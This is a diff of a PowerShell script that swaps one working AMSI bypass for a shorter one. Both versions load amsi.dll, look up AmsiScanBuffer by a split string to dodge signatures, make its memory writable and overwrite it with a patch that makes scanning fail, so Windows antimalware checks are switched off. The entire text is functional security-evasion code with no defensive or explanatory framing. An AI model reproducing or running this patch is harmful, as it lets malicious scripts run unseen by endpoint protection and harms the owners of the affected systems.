@@ -1,48 +1,29 @@
-﻿$Ref = (
-"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
-"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
-)
-
-$Source = @"
+﻿$Win32 = @"
 using System;
 using System.Runtime.InteropServices;
 
-namespace Bypass
-{
-    public class AMSI
-    {
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+public class Win32 {
 
-        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
-        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
-        public static int Disable()
-        {
-            IntPtr TargetDLL = LoadLibrary("amsi.dll");
-            if (TargetDLL == IntPtr.Zero) { return 1; }
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
 
-            IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
-            if (ASBPtr == IntPtr.Zero) { return 1; }
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
-            UIntPtr dwSize = (UIntPtr)5;
-            uint Zero = 0;
+    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
+    static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
 
-            if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }
-
-            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
-            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-            MoveMemory(ASBPtr, unmanagedPointer, 6);
-
-            return 0;
-        }
-    }
 }
 "@
 
-Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
